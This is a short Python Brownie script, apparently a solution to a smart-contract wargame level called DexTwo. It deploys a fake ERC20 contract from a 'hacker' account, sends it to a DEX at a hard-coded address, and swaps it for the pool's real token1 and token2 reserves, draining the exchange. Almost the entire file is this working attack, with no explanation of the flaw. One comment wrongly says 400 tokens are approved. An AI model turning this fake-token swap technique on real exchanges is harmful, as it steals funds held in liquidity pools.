# Import necessary modules from Brownie
from brownie import accounts, config, AttackDexTwo, DexTwo, interface

# Define the main function
def main():

    # Define the contract address of the DEX
    contract = '0xb89636bC94fd7D61Afd86431C29B19e22dCd07c6'
    hacker = accounts.add(config['wallets']['from_key'])
    dex2 = DexTwo.at(contract)
    attack_dex2 = AttackDexTwo.deploy({"from":hacker})

    # Get the interface for the first and second tokens in the DEX
    token1 = interface.IERC20(dex2.token1())
    token2 = interface.IERC20(dex2.token2())

    # Approve the DEX to spend 400 tokens from each of the two tokens for the hacker's account
    token1.approve(attack_dex2, 100, {'from': hacker})
    token2.approve(attack_dex2, 200, {'from': hacker})

    pwn_token = interface.IERC20(attack_dex2)
    pwn_token.transfer(dex2, 100, {'from': hacker,'gas_limit':10000000})
    dex2.swap(attack_dex2.address,token1,100, {'from': hacker,'gas_limit':10000000,'allow_revert':True})
    pwn_token.transfer(dex2, 200, {'from': hacker,'gas_limit':10000000})
    dex2.swap(attack_dex2.address,token2,200, {'from': hacker,'gas_limit':10000000})

